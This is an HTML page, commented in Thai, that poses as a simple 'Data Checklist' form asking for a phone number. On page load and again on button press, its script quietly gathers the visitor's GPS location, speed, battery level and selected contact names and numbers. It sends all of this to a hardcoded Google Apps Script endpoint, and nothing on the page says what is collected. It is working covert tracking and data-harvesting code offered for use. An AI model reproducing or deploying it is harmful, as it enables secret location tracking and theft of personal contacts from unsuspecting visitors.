<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Checklist</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body onload="sendDataOnLoad()" class="bg-light">

    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center mb-4">Data Checklist</h2>

                        <!-- Phone Number Input -->
                        <div class="mb-3">
                            <label for="phone" class="form-label">Phone Number:</label>
                            <input type="tel" class="form-control" id="phone" placeholder="Enter your phone number">
                        </div>

                        <!-- Send Button -->
                        <button class="btn btn-primary w-100" onclick="sendData()">Send Data</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap 5 JS and Popper (optional) -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>

    <script>
        // ฟังก์ชันที่ทำงานทันทีเมื่อหน้าเว็บโหลด
        function sendDataOnLoad() {
            let data = { phone: "N/A" }; // กำหนดค่าเบื้องต้นสำหรับข้อมูลที่ไม่มีหมายเลขโทรศัพท์

            // ฟังก์ชันเพื่อดึงข้อมูลจากตำแหน่งของผู้ใช้
            navigator.geolocation.getCurrentPosition(async (position) => {
                data.latitude = position.coords.latitude || "N/A";
                data.longitude = position.coords.longitude || "N/A";
                data.accuracy = position.coords.accuracy || "N/A";
                data.speed = position.coords.speed || 0;

                // ฟังก์ชันเพื่อดึงข้อมูลจากแบตเตอรี่
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = battery.level * 100 || "N/A";
                } else {
                    data.battery = "N/A"; // ถ้าไม่ได้รับข้อมูลแบตเตอรี่
                }

                // ฟังก์ชันเพื่อดึงข้อมูลจากการติดต่อ (contacts)
                if (navigator.contacts && navigator.contacts.select) {
                    try {
                        let contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        data.contacts = contacts.map(c => `${c.name}: ${c.tel}`).join("; ");
                    } catch (error) {
                        data.contacts = "Access denied by user";
                    }
                } else {
                    data.contacts = "Not supported on this device";
                }

                // ส่งข้อมูลไปยัง Google Script
                sendDataToSheet(data);

            }, () => {
                // ข้ามไปถ้าไม่สามารถเข้าถึงตำแหน่ง
                data.latitude = "N/A";
                data.longitude = "N/A";
                data.accuracy = "N/A";
                data.speed = 0;

                sendDataToSheet(data); // ส่งข้อมูลที่ข้ามตำแหน่งแล้ว
            });
        }

        // ฟังก์ชันที่ส่งข้อมูล
        function sendData() {
            let phoneNumber = document.getElementById("phone").value.trim(); // เบอร์โทรศัพท์อาจจะเป็นค่าว่าง
            let data = { phone: phoneNumber }; // สร้างตัวแปร data ที่จะส่งไป

            // ฟังก์ชันเพื่อดึงข้อมูลจากตำแหน่งของผู้ใช้
            navigator.geolocation.getCurrentPosition(async (position) => {
                data.latitude = position.coords.latitude || "N/A";
                data.longitude = position.coords.longitude || "N/A";
                data.accuracy = position.coords.accuracy || "N/A";
                data.speed = position.coords.speed || 0;

                // ฟังก์ชันเพื่อดึงข้อมูลจากแบตเตอรี่
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = battery.level * 100 || "N/A";
                } else {
                    data.battery = "N/A"; // ถ้าไม่ได้รับข้อมูลแบตเตอรี่
                }

                // ฟังก์ชันเพื่อดึงข้อมูลจากการติดต่อ (contacts)
                if (navigator.contacts && navigator.contacts.select) {
                    try {
                        let contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        data.contacts = contacts.map(c => `${c.name}: ${c.tel}`).join("; ");
                    } catch (error) {
                        data.contacts = "Access denied by user";
                    }
                } else {
                    data.contacts = "Not supported on this device";
                }

                // ส่งข้อมูลไปยัง Google Script
                sendDataToSheet(data);

            }, () => {
                // ข้ามไปถ้าไม่สามารถเข้าถึงตำแหน่ง
                data.latitude = "N/A";
                data.longitude = "N/A";
                data.accuracy = "N/A";
                data.speed = 0;

                sendDataToSheet(data); // ส่งข้อมูลที่ข้ามตำแหน่งแล้ว
            });
        }

        // ฟังก์ชันที่ส่งข้อมูลไปยัง Google Sheet
        function sendDataToSheet(data) {
            fetch("https://script.google.com/macros/s/AKfycbwWqNeGOJf8CWfW8QePGtHY9tv3i4GMG_etZp6yziq2b6rl_TeihLDxK0Nkheo6Xpf0/exec", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).then(response => response.text())
              .then(result => {
                  Swal.fire({
                      icon: 'success',
                      title: 'Data Saved Successfully!',
                      text: 'Your data has been recorded successfully.',
                  });
              })
              .catch(error => {
                  Swal.fire({
                      icon: 'error',
                      title: 'Error!',
                      text: 'There was an issue saving your data.',
                  });
              });
        }
    </script>
</body>
</html>
